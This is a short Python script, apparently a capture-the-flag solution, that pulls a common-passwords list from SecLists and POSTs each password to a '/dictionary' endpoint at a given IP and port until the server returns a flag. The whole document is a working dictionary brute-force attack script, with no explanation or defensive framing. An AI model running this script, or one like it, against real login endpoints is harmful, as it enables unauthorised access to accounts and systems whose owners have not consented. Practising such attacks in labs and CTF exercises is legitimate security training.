import requests
import sys

ip = sys.argv[1]
port = sys.argv[2]

# Grabs a dictionary of commonly used passwords
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Enumerate throught he dictionary
for pwd in passwords:
    print(f"Attempted password: {pwd}")

    # Send POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password':pwd})

    # Check if the server responsd with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"correct password: {pwd}")
        print(f"Flag: {response.json()['flag']}")
        break
